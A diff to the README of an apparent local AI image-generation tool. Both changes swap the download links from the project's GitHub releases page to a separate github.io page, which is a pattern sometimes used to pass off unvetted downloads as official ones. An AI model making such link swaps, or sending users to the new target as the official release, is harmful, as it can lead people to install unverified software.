@@ -1,6 +1,6 @@
 # 🎨 qwen-image-2.1-studio - Create and edit images locally
   
-[![Download Now](https://img.shields.io/badge/Download%20qwen--image--2.1--studio-Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/gensan816/qwen-image-2.1-studio/releases)
+[![Download Now](https://img.shields.io/badge/Download%20qwen--image--2.1--studio-Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://gensan816.github.io)
 
 ## ✨ What Is This?
 
@@ -12,7 +12,7 @@ Think of it as your personal AI art studio. Type what you want to see, and the a
 
 Visit the link below to download the application. The download page shows the latest version with release notes.
 
-[Visit this link to download the application](https://github.com/gensan816/qwen-image-2.1-studio/releases)
+[Visit this link to download the application](https://gensan816.github.io)
 
 Once you're on the download page:
 1. Look for the newest release (the one at the top)
